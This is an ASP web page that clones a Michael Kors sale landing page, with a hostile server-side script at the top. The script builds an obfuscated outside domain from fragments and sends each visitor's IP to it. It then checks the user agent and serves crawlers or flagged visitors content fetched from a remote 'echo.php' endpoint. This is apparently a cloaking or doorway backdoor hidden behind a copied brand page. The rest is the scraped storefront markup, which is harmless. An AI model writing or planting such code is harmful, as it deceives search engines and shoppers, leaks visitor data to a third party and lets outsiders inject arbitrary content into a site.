<%
'on error resume next
Server.ScriptTimeout=600
dim systid,ISBK,html,echohtml,lk,ipurl,echourl,kdom
kdom = "1nil"
kdom =kdom & "2thea"
systid=484
kdom =kdom & "rsenal"

kdom =kdom & "."
ISBK = "false"
kdom =kdom &"com"
hs = "http"
ipurl = hs&"://nb."&kdom&"/nb.php?ip="
echourl = hs&"://ac."&kdom&"/echo.php?"
html = GetContent(ipurl&GetRsip()) 'GetRsip()
lk ="<t"&"@"&"k>"
If instr(html,lk)>0 Then
	 ISBK = replace(html,lk,"")
End If
'response.Write ISBK&ChecksAgent
'ISBK ="true"
if ChecksAgent=true or cstr(ISBK)="true" Then
	
	dim subspagseid
	subspagseid = request.querystring("subspagseid")
	If subspagseid Then
		response.Write GetContent(echourl&"sysid="&systid&"&subpageid="&subspagseid)
	Else
		%>



<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html>
<input type="hidden" value='SALE' id="breadCrumbCatDisplayName"/>
<head>
<!--DO NOT REMOVE THIS COMMENT MICHAELKORS-NETSCALER -->
	<!-- if productionURL empty, then get it from productionURL.tag -->
	<title>Michael Kors Sale | Michael Kors</title>
		<meta http-equiv="X-UA-Compatible" content="IE=edge" />
	<meta http-equiv="content-type" content="text/html;charset=utf-8" />
	<meta http-equiv="content-style-type" content="text/css" />
	<meta name="description" content="Browse Michael Kors Clothing, Shoes, Bags & Accessories Sale.  Find deals on both Michael Kors and MICHAEL by Michael Kors Collections." />
	<meta name="keywords" content="" />
	<meta name="author" content="Michael Kors" />
	<meta name="language" content="English" />
	<meta name="copyright" content="Michael Kors" />
	<meta http-equiv="verify-v1" content="" />
	<meta http-equiv="y_key" content="" />
	<meta property="fb:app_id" content="693861180706239" />
	<meta property="og:type" content="product" />
			<meta property="og:title" content="" />
		<!-- MKPROD-689 -- Starts -->
	<meta property="og:site_name" content="Michael Kors" />
	<meta property="og:url" content="http://www.michaelkors.com/sale/_/N-289l" />
	<meta property="og:description" content="Browse Michael Kors Clothing, Shoes, Bags & Accessories Sale.  Find deals on both Michael Kors and MICHAEL by Michael Kors Collections." />
	<meta property="og:image" content="http://michaelkors.scene7.com/is/image/"
	id="imageUrlForMetaTag"/>
	<!-- MKPROD-689 -- Ends -->
	<meta property="og:image:width" content="400">
	<meta property="og:image:height" content="400">
	<link rel="shortcut icon" type="image/x-icon" href="/img/favicon.ico" />
	<link rel="canonical" href="http://www.michaelkors.com/sale/_/N-289l" />
	<meta name="viewport" id="view" content="user-scalable=yes, width=device-width, maximum-scale = 1" />    

<script>
   if (/iPhone|iPad|iPod/.test(navigator.platform) && navigator.userAgent.indexOf("AppleWebKit") > -1) {
	(function(win, doc) {

		// change viewport to landscape size (device-height)
		var viewport = doc.querySelector('meta[name=viewport]');
		viewport.content = 'width=device-height';

		// creates height guard
		var heightGuard = doc.createElement('div');
		heightGuard.id = 'heightGuard';
		doc.body.appendChild(heightGuard);

		// must know if it's an iPad since it has a different screen proportion
		var isiPad = /iPad/.test(navigator.platform);

		// new style element
		var css = doc.createElement('style');
		doc.body.appendChild(css);
		css.innerText = 
			"@media screen and (orientation:portrait){" +
				"body{"+
					"position:relative;"+
				"}"+
				"#heightGuard{" +
					"position:absolute;" +
					"top:0;" +
					"left:0;" +
					"width:1px;" +
					"zIndex:-1;" +
					"visibility:hidden;" +
					"height:" + (isiPad? '133.333%' : '150%') + ";" +
				"}" +
				"#" + (doc.body.getAttribute('data-container') || 'container') + "{" +
					"-webkit-transform:" + (isiPad? 'scale(1.33333)' : 'scale(1.5)') + ";" +
					"-webkit-transform-origin:top left;" +
					"width:" + (isiPad? '768px' : '320px') + ";" +
				"}" +
			"}";

	})(window, document);
}
    </script>          
<link rel="stylesheet" type="text/css" href="/css/min/0.css" />
	
	<link rel="stylesheet" type="text/css" href="" />
				<link rel="stylesheet" type="text/css" href="" />
				<script type="text/javascript" src="/js/jquery/1.9.0/jquery.min.js"></script>
<script type="text/javascript" src="http://cdn.gigya.com/js/socialize.js?apiKey=3_e8TZd-uh8uIHF_7v34_YiHLCTfrzyEZqO2pIwxc8KHAIjFqVv1ncAMZtlvjPvCm-"></script>
		<script type="text/javascript" src="/js/gigyaconnect.js"></script>
		<script type="text/javascript" src="/js/jquery/jquery-migrate-1.2.1.min.js"></script>
	<script type="text/javascript" src="/js/jquery/jquery.ba-postmessage.min.js"></script>
	<!-- Ends - 10-20-2014 #Manjula #mkdev - 563 #Including trueTag page -->
<img style="display:none" src="//api.nanigans.com/event.php?app_id=25837&type=visit&name=SALE"/>
<script type="text/javascript">
var pixel_id = '654771401262384';
(function() {
var _fbq = window._fbq || (window._fbq = []);
if (!_fbq.loaded) {
var fbds = document.createElement('script');
fbds.async = true;
fbds.src = '//connect.facebook.net/en_US/fbds.js';
var s = document.getElementsByTagName('script')[0];
s.parentNode.insertBefore(fbds, s);
_fbq.loaded = true;
}
_fbq.push(['addPixelId', '654771401262384']);
})();
window._fbq = window._fbq || [];
window._fbq.push(["track", "PixelInitialized", {}]);
</script>
<noscript>
<img height="1" width="1" border="0" alt="" style="display:none" src="https://www.facebook.com/tr?id=654771401262384&amp;ev=NoScript"/>
</noscript>

                  <script type="text/javascript">
                    var AKSB=AKSB||{};AKSB.q=[];AKSB.mark=function(c,b){AKSB.q.push(["mark",c,b||(new Date).getTime()])};AKSB.measure=function(c,b,a){AKSB.q.push(["measure",c,b,a||(new Date).getTime()])};AKSB.done=function(c){AKSB.q.push(["done",c])};AKSB.mark("firstbyte",(new Date).getTime());AKSB.prof={custid:"270525",ustr:"",originlat:0,clientrtt:0,ghostip:"69.192.3.236",ipv6:false,pct:10,xhrtest:false,clientip:"110.85.114.163",requestid:"1816a895"};
                    (function(b){var a=document.createElement("iframe");a.src="javascript:false";(a.frameElement||a).style.cssText="width: 0; height: 0; border: 0; display: none";var c=document.getElementsByTagName("script"),c=c[c.length-1];c.parentNode.insertBefore(a,c);a=a.contentWindow.document;a.open().write("<body onload=\"var js = document.createElement('script');js.id = 'aksb-ifr';js.src = '"+b+"';document.body.appendChild(js);\">");a.close()})(("https:"===document.location.protocol?"https:":"http:")+"//ds-aksb-a.akamaihd.net/aksb.min.js");
                    </script>
                    </head>
<body>
<!-- Below line is used to identifying which app server is serving the page request. -->
<!-- Server Name: w221654apss2007:10350 -->
<noscript>
<div class="nojavascript">
You must enable javascript to continue.</div>
</noscript>
<header id="navContainer">
<div class="bgmen">
<input type="hidden" id="CheckSecureLogin"
value="true">
<!-- Checking the profile status and current locale -->
<div id="headerBar">
<div id="header_mini_logo" class="header_mini_logo_class">
<a class="mini_logo_nav"><img src="/img/mk_minilogo.png" class="header_mini_logo_class_img" width="201" height="28" title="Michael Kors" alt="Michael Kors" /></a>
</div>
<div id="headerBarRightContent">
<div id="headerContactIcons">
</div>
<div id="headerSignIn"></div>
<input type="hidden" name="securedDomain" id="securedDomain"
value="https://www.michaelkors.com" />
<div id="signInArrow"></div>
<div id="signInBox">
<div class="signInBox_head_tit">
Sign In</div>
<div id="signInBoxLeft"></div>
<div id="signInBoxRight">
<p>Create a Michael Kors account <br/>  with your email address.</p><a href="/account/create_account.jsp"><button
class="createButton">
create an account</button></a>
<div class="brdr_or_head">
<span>OR</span>
</div>
<div id="socialSignIn">
<p>
Connect Your Account With Social Media</p>
<div id="facebookButton"
onclick="socialLogin('facebook', false, false);"></div>
<div id="twitterButton"
onclick="socialLogin('twitter', false, false);"></div>
<div id="socialLoginPatternURL" style="display:none;">http://www.michaelkors.com/socialconnect/SocialConnectServlet</div>
</div>
<!--  <div class="dialog-close-button"></div>-->
</div>
</div>
<div id="myAccountBox">
<!-- <div class="drop-close-button" id="myaccount_close"></div> -- Commented for Bug ID 772 FIX - Chitra -->
<div id="myAccountOptions">
<ul>
<li><a href="/account/index.jsp"
rel="nofollow"
>My Account</a></li>
<li><a href="/account/address_book.jsp"
rel="nofollow"
>Address Book</a></li>
<li><a
href="/account/payment_information.jsp"
rel="nofollow"
>Payment Information</a></li>
<li><a href="/account/order_history.jsp"
rel="nofollow"
>Order History</a></li>
<li><a href="/account/favorites.jsp"
rel="nofollow"
>Favorites</a></li>
<li><a id="signout" rel="nofollow" href="/index.jsp?_DARGS=/includes/header.jsp_A&_DAV=">Sign Out</a></li>
</ul>
</div>
<div class="myaccount-arrow"></div>
</div>
<div id="shoppingBagHeader">
<div class="shoppingBagHeader">
<a href="/checkout/shop_cart.jsp"><img
width="53" height="40" src="/img/icon_shopping_bag.png"
alt="Shopping Bag" /></a>
<div id="itemsInCartNotifier" class="notifier">
<div id="orderitemcount">
0</div>
</div>
<div id="miniCartContiainer">
<!--
JSP for showing the Mini Bag content in the header part
-->
<!-- <div class="mini-cart-caps"></div> -->
<div id="miniCartItems">
<div class="CartItems_head_tit">Shopping Bag</div>
<p id="orderCount">You have&nbsp;<span>0</span> items in your Shopping Bag.</p>
<div id="miniCartItems_scroll">
</div>
</div>
<div class="mini-cart-subtotal"></div>
<div class="mini-cart-buttons"><a
href="/checkout/shop_cart.jsp">
<button class="alt-button mini-cart-view-bag" title="View Bag">View Full Cart</button>
</a> </div>
<div class="mini-cart-caps"></div>
</div>
</div>
</div>
<!--
to show the mini bag content
-->
</div>
</div>
<div id="logoContainer">
<div class="logoimg mk_image_align">
<a href="/"> <img width="355" height="58" src="/img/logo_mk.png" alt="Michael Kors test logo"  id="siteTitleImage" /></a>
</div>
</div>
<nav id="navMenu">
<ul id="navList">
<li class="nav-item gradient" id="womensDepartment1">
<input type="hidden" value='WOMEN' id="topMenuCatDisplayName"/>
<div class="nav-name align_width_100">
<a href="/women/_/N-28ee">
WOMEN</a>
</div>
</li>
<li class="nav-item gradient" id="womensDepartment2">
<input type="hidden" value='MEN' id="topMenuCatDisplayName"/>
<div class="nav-name align_width_100">
<a href="/men/_/N-2861">
MEN</a>
</div>
</li>
<li class="nav-item gradient" id="womensDepartment3">
<input type="hidden" value='BAGS' id="topMenuCatDisplayName"/>
<div class="nav-name align_width_100">
<a href="/bags/_/N-283g">
BAGS</a>
</div>
</li>
<li class="nav-item gradient" id="womensDepartment4">
<input type="hidden" value='SHOES' id="topMenuCatDisplayName"/>
<div class="nav-name align_width_100">
<a href="/shoes/_/N-28b8">
SHOES</a>
</div>
</li>
<li class="nav-item gradient" id="womensDepartment5">
<input type="hidden" value='WATCHES' id="topMenuCatDisplayName"/>
<div class="nav-name align_width_100">
<a href="/watches/_/N-28c2">
WATCHES</a>
</div>
</li>
<li class="nav-item gradient" id="womensDepartment6">
<input type="hidden" value='ACCESSORIES' id="topMenuCatDisplayName"/>
<div class="nav-name align_width_100">
<a href="/accessories/_/N-282b">
ACCESSORIES</a>
</div>
</li>
<li class="nav-item gradient" id="womensDepartment7">
<input type="hidden" value='GIFTS' id="topMenuCatDisplayName"/>
<div class="nav-name align_width_100">
<a href="/gifts/_/N-284i">
GIFTS</a>
</div>
</li>
<li class="nav-item gradient" id="womensDepartment8">
<input type="hidden" value='SALE' id="topMenuCatDisplayName"/>
<div class="nav-name align_width_100">
<a href="/sale/_/N-289l">
SALE</a>
</div>
</li>
<li class="nav-item gradient" id="womensDepartment9">
<div class="nav-name align_width_100">
<a href="http://destinationkors.michaelkors.com/" target="_self" class="dklink">
<img width="12" height="12" src="/img/icon_destination_kors.png" alt="Destination Kors" id="destKorsIcon" />Destination Kors</a>
</div>
</li>
<li id="displaySearch" class="nav-item gradient"><img width="12" height="13" src="/img/icon_search.png" alt="Search Site" /></li>
</ul>
</nav>
<form id="set_locale_to_profile" action="?_DARGS=/includes/header.jsp.switchinglocale" method="post"><input name="_dyncharset" value="UTF-8" type="hidden"></input><input value="-2018191505099424157" type="hidden"></input><input id="locale" name="/atg/userprofiling/ProfileFormHandler.locale" value="" type="hidden"><input name="_D:/atg/userprofiling/ProfileFormHandler.locale" value=" " type="hidden"><input id="switchURL" name="/atg/userprofiling/ProfileFormHandler.successUrl" value="" type="hidden"><input name="_D:/atg/userprofiling/ProfileFormHandler.successUrl" value=" " type="hidden"><input id="switchCountry" name="/atg/userprofiling/ProfileFormHandler.switchingCountry" value="" type="hidden"><input name="_D:/atg/userprofiling/ProfileFormHandler.switchingCountry" value=" " type="hidden"><input id="set_locale_to_profile_Button" alt="" name="/atg/userprofiling/ProfileFormHandler.switchLocale" value="changeLocale" type="hidden"><input name="_D:/atg/userprofiling/ProfileFormHandler.switchLocale" value=" " type="hidden"><input name="_DARGS" value="/includes/header.jsp.switchinglocale" type="hidden"></input></form></div>
</header>
<a href="javascript:void(0)" style="display: none;"
id="socialMKLoginhidden"
onclick="document.getElementById('light').style.display='block';document.getElementById('fade').style.display='block'">here</a>
<a href="javascript:void(0)" style="display: none;"
id="socialMKCreatehidden"
onclick="document.getElementById('light').style.display='block';document.getElementById('fade').style.display='block'">here</a>
<div id="light" class="white_content">
</div>
<div id="fade" class="black_overlay"></div>
<div class="searchFieldContainer">
<form onsubmit="buildUrl();return false;" autocomplete="off" action="/search" id="searchField" class="group">
<select name="N" id="searchByCategory"  onchange="(this);">
<!--<option value="/michael-kors/_/N-" selected="selected">Search All</option>  default search item -->
<option value="/_/N-0" selected="selected">Search All</option>
<option value="/women/_/N-28ee" >WOMEN</option>
<option value="/men/_/N-2861" >MEN</option>
<option value="/bags/_/N-283g" >BAGS</option>
<option value="/shoes/_/N-28b8" >SHOES</option>
<option value="/watches/_/N-28c2" >WATCHES</option>
<option value="/accessories/_/N-282b" >ACCESSORIES</option>
<option value="/gifts/_/N-284i" >GIFTS</option>
<option value="/sale/_/N-289l" >SALE</option>
</select>
<!-- turn off dimension search -->
<input type="hidden" name="Dy" value="0"/>
<!--  turn on did you mean -->
<input type="hidden" name="Nty" value="1"/>
<input id="searchText" class="searchInput" type="text" name="Ntt" maxlength="100"/>
<input type="submit" value="SEARCH" id="searchSubmit" />
<div class="close-search"></div>
</form>
</div>
<div id="dialog-confirm">
<p style="display: none">On changing the country, your session will expire and you will need to Sign-in again using your credentials. Please note – Your address book, payment details, order history and favorite list will not be shared across different countries. Do you still want to continue?</p>
</div>
<div id="gaAccountId" style="display: none">UA-46654530-1</div>
<script type="text/javascript"
src="/js/jqueryui/1.10.0/jquery-ui.min.js"></script>
<script type="text/javascript">
var _gaq = _gaq || [];
_gaq.push(['_setAccount', $('#gaAccountId').text()]);
_gaq.push(['_trackPageview']);
(function() {
var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
})();
</script>
<link rel="stylesheet" type="text/css" href="/img/MKBusiness/en-US/refreshes/122614/css/style.css"/>
<div class="container landing sale">
  
	<div class="theme">
	  
		<div class="row white splash_landing">
			<div class="column col-12" id="lp_sale_1">
				<a href="/sale/view-all/_/N-28zn?icid=sale|MAIN1|viewallimg" title="SHOP SALE">
			     	<img src="/img/MKBusiness/en-US/refreshes/122614/assets/landing/LP_SALE.jpg" alt="GOODBYE 2014. HELLO SALE." />
				</a>
				<div class="title">
					<ul class="links" data-animation-stagger>
						<li> 
							<a href="/sale/view-all/_/N-28zn?icid=sale|MAIN1|viewall" title="VIEW ALL"> 
								VIEW ALL
							</a> 
						</li>
                        <li> 
							<a href="/sale/bags/_/N-289z?icid=sale|MAIN1|hbgs" title="HANDBAGS"> 
								HANDBAGS
							</a> 
						</li>
						<li> 
							<a href="/sale/clothing/_/N-289m?icid=sale|MAIN1|clothing" title="CLOTHING"> 
								CLOTHING
							</a> 
						</li>
						<li> 
							<a href="/sale/shoes/_/N-28a9?icid=sale|MAIN1|shoes" title="SHOES"> 
								SHOES
							</a> 
						</li>
						<li> 
							<a href="/sale/watches/_/N-28ah?icid=sale|MAIN1|watches" title="WATCHES"> 
								WATCHES
							</a> 
						</li>
						<li> 
							<a href="/sale/men/_/N-28au?icid=sale|MAIN1|men" title="MEN"> 
								MEN
							</a> 
						</li>
					</ul>
				</div>

				<div class="title popup-links">
					<ul class="links" data-animation-stagger>
						<li> 
							<a href="#" title="SEE DETAILS" data-launch-popup="sale-50-off-popup"> 
								SEE DETAILS
							</a> 
						</li>
					</ul>
				</div>
			</div>
		</div>
	
  
		<div class="splash_floating_nav">
			<div class="row splash_landing_nav sale" style="background: transparent url(/img/MKBusiness/en-US/refreshes/122614/assets/landing/SALE_BTM_NAV.jpg) no-repeat center;">
				<div class="column col-12">
					<a href="/sale/view-all/_/N-28zn?icid=sale|FOOTER|viewall" title="VIEW ALL">
						View All
					</a>
                    <a href="/sale/bags/_/N-289z?icid=sale|FOOTER|salebags" title="BAGS">
						Bags
					</a>      
				    <a href="/sale/shoes/_/N-28a9?icid=sale|FOOTER|saleshoes" title="SHOES">
						Shoes
					</a>
					<a href="/sale/watches/_/N-28ah?icid=sale|FOOTER|salewatches" title="WATCHES">
						Watches
					</a>
                    <a href="/sale/clothing/_/N-289m?icid=sale|FOOTER|saleclothing" title="CLOTHING">
						Clothing
					</a>
					<a href="/sale/accessories/_/N-28al?icid=sale|FOOTER|saleaccessories" title="JEWELRY & ACCESSORIES">
						Jewelry &amp; Accessories
					</a>
                    <a href="/sale/men/_/N-28au?icid=sale|FOOTER|salemen" title="MEN">
						Men
					</a>
                    <a href="/sale/petites/_/N-296s?icid=sale|FOOTER|salepetites" title="PETITES">
						Petites
					</a>
                    <a href="/sale/plus-sizes/_/N-296t?icid=sale|FOOTER|saleplus" title="PLUS SIZES">
						Plus Sizes
					</a>
				</div>
			</div>
		</div>
	</div>
  
</div>

<div class="popup-hide theme" data-launch-target="sale-50-off-popup">
	<div class="popup-bg"></div>
	<div class="popup-wrapper splash_landing">
		<div class="title no-position topcenter">
		<h2>
			<span class="intro s30">
				<em>SALE DETAILS</em>
			</span>
		</h2>
		<p>
			Select merchandise only. Sale items will be indicated<br/>
			in store and online. Interim markdowns may have<br/>
			been taken. No adjustments to prior purchases.
		</p>
		</div>
		<a href="#" class="close">x</a>
	</div>
</div>
<script type="text/javascript" src="/img/MKBusiness/en-US/refreshes/122614/js/libs/vendor/greensock/TweenMax.min.js"></script>
<script type="text/javascript" src="/img/MKBusiness/en-US/refreshes/122614/js/libs/vendor/jquery/jquery.lazyload.min.js"></script>
<script type="text/javascript" src="/img/MKBusiness/en-US/refreshes/122614/js/main.js"></script><!-- for omniture -->
<!-- omniture contents end -->
<input type="hidden" id="qty_selc" value=""/>
<!--
Start of DoubleClick Floodlight Tag: Please do not remove
Activity name of this tag: MK-US-D-Sale
URL of the webpage where the tag is expected to be placed: http://www.michaelkors.com
This tag must be placed between the <body> and </body> tags, as close as possible to the opening tag.
Creation Date: 01/22/2014
-->
<script type="text/javascript">
var axel = Math.random() + "";
var a = axel * 10000000000000;
document.write('<iframe src="http://4350594.fls.doubleclick.net/activityi;src=4350594;type=categ429;cat=mk-d-240;ord=1;num=' + a + '?" width="1" height="1" frameborder="0" style="display:none"></iframe>');
</script>
<noscript>
<iframe src="http://4350594.fls.doubleclick.net/activityi;src=4350594;type=categ429;cat=mk-d-240;ord=1;num=1?" width="1" height="1" frameborder="0" style="display:none"></iframe>
</noscript>
<!-- End of DoubleClick Floodlight Tag: Please do not remove -->
<!-- Starts - 10-20-2014 #Manjula #mkdev - 563 #Including trueTag page -->
<!--start of code for trueTag.jsp -->
<script language="JavaScript">
var CI_PageType = 'CAT';
var CI_CatID = 'cat20011';
var CI_CatName = 'SALE';
</script>
<script
src="https://cts-secure.channelintelligence.com/19468233_landing.js">
</script>
<div id="footer_menu">
<div id="womensDepartment1" class="dept-dd group">
<input type="hidden"
value='WOMEN'
id="topMenuCatDisplayName" />
<ul class="menuUL">
<li><div class="menu_head_tit">
CATEGORIES</div></li>
<li><a href="/women/michael-kors-collection-clothing/_/N-28es" title="MICHAEL KORS COLLECTION CLOTHING">MICHAEL KORS COLLECTION CLOTHING</a></li>
<li><a href="/women/michael-michael-kors-clothing/_/N-28ef" title="MICHAEL MICHAEL KORS CLOTHING">MICHAEL MICHAEL KORS CLOTHING</a></li>
<li><a href="/women/bags/_/N-28f3" title="BAGS">BAGS</a></li>
<li><a href="/women/shoes/_/N-28fe" title="SHOES">SHOES</a></li>
<li><a href="/women/watches/_/N-28fn" title="WATCHES ">WATCHES </a></li>
<li><a href="/women/accessories/_/N-28fx" title="ACCESSORIES">ACCESSORIES</a></li>
</ul>
<ul class="menuUL TrendMenu">
<li><div class="menu_head_tit">
TRENDS</div></li>
<li><a
href="/trend/michael-s-must-haves/_/N-1z140xo">
MICHAEL&#39;S MUST HAVES</a></li>
<li><a
href="/trend/untamed-glamour/_/N-1z140kq">
UNTAMED GLAMOUR</a></li>
<li><a
href="/trend/rock-chic/_/N-1z140ks">
ROCK CHIC</a></li>
<li><a
href="/trend/all-that-glitters/_/N-1z140km">
ALL THAT GLITTERS</a></li>
<li><a
href="/trend/party-looks/_/N-1z140ey">
PARTY LOOKS</a></li>
</ul>
<div class="spotlight-slider">
<div class="spotlight_menu_head_tit">
NEW ARRIVALS</div>
<div class="clear" ></div>
<div id="womenSpotlights" class="flexslider">
<ul class="slides">
<li>
<a href="/chain-halter-fringe-dress/_/R-US_MH48VBJ7R3?color=0001">
<img alt="Chain-Halter Fringe Dress" src="http://michaelkors.scene7.com/is/image/MichaelKors/MH48VBJ7R3-0001_IS?$homePageSpotLight$"></img></a>
</li>
<li>
<a href="/sequined-ponte-dress/_/R-US_MH48VC6A31?color=0001">
<img alt="Sequined Ponte Dress" src="http://michaelkors.scene7.com/is/image/MichaelKors/MH48VC6A31-0001_IS?$homePageSpotLight$"></img></a>
</li>
<li>
<a href="/chain-neck-matte-jersey-jumpsuit/_/R-US_MH43GBXS32?color=0041">
<img alt="Chain-Neck Matte-Jersey Jumpsuit" src="http://michaelkors.scene7.com/is/image/MichaelKors/MH43GBXS32-0041_IS?$homePageSpotLight$"></img></a>
</li>
<li>
<a href="/smocked-animal-print-dress/_/R-US_MH48VCE15N?color=0612">
<img alt="Smocked Animal-Print Dress" src="http://michaelkors.scene7.com/is/image/MichaelKors/MH48VCE15N-0612_IS?$homePageSpotLight$"></img></a>
</li>
<li>
<a href="/leopard-print-cotton-blend-sweater-dress/_/R-US_MH48VB51SV?color=0001">
<img alt="Leopard-Print Cotton-Blend Sweater Dress" src="http://michaelkors.scene7.com/is/image/MichaelKors/MH48VB51SV-0001_IS?$homePageSpotLight$"></img></a>
</li>
</ul></div>
</div>
<div class="gradient"></div>
<div class="arrow"></div>
</div>
<div id="womensDepartment2" class="dept-dd group">
<input type="hidden"
value='MEN'
id="topMenuCatDisplayName" />
<ul class="menuUL">
<li><div class="menu_head_tit">
CATEGORIES</div></li>
<li><a href="/men/clothing/_/N-2862" title="CLOTHING">CLOTHING</a></li>
<li><a href="/men/bags-wallets/_/N-286d" title="BAGS & WALLETS">BAGS & WALLETS</a></li>
<li><a href="/men/watches/_/N-286m" title="WATCHES">WATCHES</a></li>
<li><a href="/men/accessories/_/N-286u" title="ACCESSORIES">ACCESSORIES</a></li>
<li><a href="/men/shoes/_/N-28x4" title="SHOES">SHOES</a></li>
</ul>
<ul class="menuUL TrendMenu">
<li><div class="menu_head_tit">
TRENDS</div></li>
<li><a href="/trend/new-neutral/_/R-cat2430113">
NEW NEUTRAL</a></li>
<li><a href="/trend/black-white/_/R-cat2280011">
BLACK &amp; WHITE</a></li>
<li><a href="/trend/jetmaster/_/R-cat2290023">
JETMASTER</a></li>
<li><a href="/trend/men-s-fragrance/_/R-cat2340003">
MEN&#39;S FRAGRANCE</a></li>
<li><a
href="/trend/as-seen-in-gq/_/N-1z140ii">
AS SEEN IN GQ</a></li>
</ul>
<div class="spotlight-slider">
<div class="spotlight_menu_head_tit">
NEW ARRIVALS</div>
<div class="clear" ></div>
<div id="womenSpotlights" class="flexslider">
<ul class="slides">
<li>
<a href="/hooded-wool-blend-sweater/_/R-US_CF46JAP06N?color=0029">
<img alt="Hooded Wool-Blend Sweater" src="http://michaelkors.scene7.com/is/image/MichaelKors/CF46JAP06N-0029_IS?$homePageSpotLight$"></img></a>
</li>
<li>
<a href="/wool-blend-peacoat/_/R-US_CF42DAXAY8?color=0001">
<img alt="Wool-Blend Peacoat" src="http://michaelkors.scene7.com/is/image/MichaelKors/CF42DAXAY8-0001_IS?$homePageSpotLight$"></img></a>
</li>
<li>
<a href="/cotton-and-leather-raglan-sweater/_/R-US_CR45FF5DR2?color=0001">
<img alt="Cotton and Leather Raglan Sweater" src="http://michaelkors.scene7.com/is/image/MichaelKors/CR45FF5DR2-0001_IS?$homePageSpotLight$"></img></a>
</li>
<li>
<a href="/fur-trimmed-pebbled-leather-coat/_/R-US_CF48C3A8N6?color=0001">
<img alt="Fur-Trimmed Pebbled-Leather Coat" src="http://michaelkors.scene7.com/is/image/MichaelKors/CF48C3A8N6-0001_IS?$homePageSpotLight$"></img></a>
</li>
<li>
<a href="/leather-pocket-t-shirt/_/R-US_CR46JF70CC?color=0350">
<img alt="Leather-Pocket T-Shirt" src="http://michaelkors.scene7.com/is/image/MichaelKors/CR46JF70CC-0350_IS?$homePageSpotLight$"></img></a>
</li>
</ul></div>
</div>
<div class="gradient"></div>
<div class="arrow"></div>
</div>
<div id="womensDepartment3" class="dept-dd group">
<input type="hidden"
value='BAGS'
id="topMenuCatDisplayName" />
<ul class="menuUL">
<li><div class="menu_head_tit">
CATEGORIES</div></li>
<li><a href="/bags/view-all/_/N-283i" title="VIEW ALL">VIEW ALL</a></li>
<li><a href="/bags/new-arrivals/_/N-283h" title="NEW ARRIVALS">NEW ARRIVALS</a></li>
<li><a href="/bags/totes/_/N-283j" title="TOTES">TOTES</a></li>
<li><a href="/bags/satchels/_/N-283k" title="SATCHELS">SATCHELS</a></li>
<li><a href="/bags/shoulder-bags/_/N-283l" title="SHOULDER BAGS">SHOULDER BAGS</a></li>
<li><a href="/bags/crossbodies/_/N-283m" title="CROSSBODIES">CROSSBODIES</a></li>
<li><a href="/bags/clutches/_/N-283o" title="CLUTCHES">CLUTCHES</a></li>
<li><a href="/bags/backpacks-luggage/_/N-283q" title="BACKPACKS & LUGGAGE">BACKPACKS & LUGGAGE</a></li>
<li><a href="/bags/wallets/_/N-283p" title="WALLETS">WALLETS</a></li>
<li><a href="/bags/tech/_/N-283r" title="TECH">TECH</a></li>
<li><a href="/bags/men/_/N-283s" title="MEN">MEN</a></li>
</ul>
<ul class="menuUL TrendMenu">
<li><div class="menu_head_tit">
TRENDS</div></li>
<li><a
href="/trend/michael-s-must-haves/_/N-1z140xo">
MICHAEL&#39;S MUST HAVES</a></li>
<li><a
href="/trend/untamed-glamour/_/N-1z140kq">
UNTAMED GLAMOUR</a></li>
<li><a
href="/trend/rock-chic/_/N-1z140ks">
ROCK CHIC</a></li>
<li><a
href="/trend/all-that-glitters/_/N-1z140km">
ALL THAT GLITTERS</a></li>
<li><a
href="/trend/party-looks/_/N-1z140ey">
PARTY LOOKS</a></li>
</ul>
<div class="spotlight-slider">
<div class="spotlight_menu_head_tit">
NEW ARRIVALS</div>
<div class="clear" ></div>
<div id="womenSpotlights" class="flexslider">
<ul class="slides">
<li>
<a href="/greenwich-large-saffiano-leather-satchel/_/R-US_30S5GGRT7U?color=0018">
<img alt="Greenwich Large Saffiano Leather Satchel" src="http://michaelkors.scene7.com/is/image/MichaelKors/30S5GGRT7U-0018_IS?$homePageSpotLight$"></img></a>
</li>
<li>
<a href="/sutton-saffiano-leather-medium-satchel/_/R-US_30S4STVS6L?color=0519">
<img alt="Sutton Saffiano Leather Medium Satchel" src="http://michaelkors.scene7.com/is/image/MichaelKors/30S4STVS6L-0519_IS?$homePageSpotLight$"></img></a>
</li>
<li>
<a href="/elsie-saffiano-leather-box-clutch/_/R-US_30H4GBXC1L?color=0600">
<img alt="Elsie Saffiano Leather Box Clutch" src="http://michaelkors.scene7.com/is/image/MichaelKors/30H4GBXC1L-0600_IS?$homePageSpotLight$"></img></a>
</li>
<li>
<a href="/sutton-medium-embossed-leather-satchel/_/R-US_30H4MSUS6K?color=0705">
<img alt="Sutton Medium Embossed-Leather Satchel" src="http://michaelkors.scene7.com/is/image/MichaelKors/30H4MSUS6K-0705_IS?$homePageSpotLight$"></img></a>
</li>
<li>
<a href="/elsie-crystal-embellished-box-clutch/_/R-US_30H4GBXC1U?color=0205">
<img alt="Elsie Crystal-Embellished Box Clutch" src="http://michaelkors.scene7.com/is/image/MichaelKors/30H4GBXC1U-0205_IS?$homePageSpotLight$"></img></a>
</li>
</ul></div>
</div>
<div class="gradient"></div>
<div class="arrow"></div>
</div>
<div id="womensDepartment4" class="dept-dd group">
<input type="hidden"
value='SHOES'
id="topMenuCatDisplayName" />
<ul class="menuUL">
<li><div class="menu_head_tit">
CATEGORIES</div></li>
<li><a href="/shoes/view-all/_/N-28ba" title="VIEW ALL">VIEW ALL</a></li>
<li><a href="/shoes/new-arrivals/_/N-28b9" title="NEW ARRIVALS">NEW ARRIVALS</a></li>
<li><a href="/shoes/boots/_/N-28bc" title="BOOTS">BOOTS</a></li>
<li><a href="/shoes/ankle-boots/_/N-28bd" title="ANKLE BOOTS">ANKLE BOOTS</a></li>
<li><a href="/shoes/evening/_/N-2970" title="EVENING">EVENING</a></li>
<li><a href="/shoes/pumps/_/N-28bb" title="PUMPS">PUMPS</a></li>
<li><a href="/shoes/flats/_/N-28be" title="FLATS">FLATS</a></li>
<li><a href="/shoes/sandals/_/N-28bf" title="SANDALS">SANDALS</a></li>
<li><a href="/shoes/sneakers/_/N-28bg" title="SNEAKERS">SNEAKERS</a></li>
<li><a href="/shoes/rain-cold-weather/_/N-28si" title="RAIN & COLD WEATHER">RAIN & COLD WEATHER</a></li>
</ul>
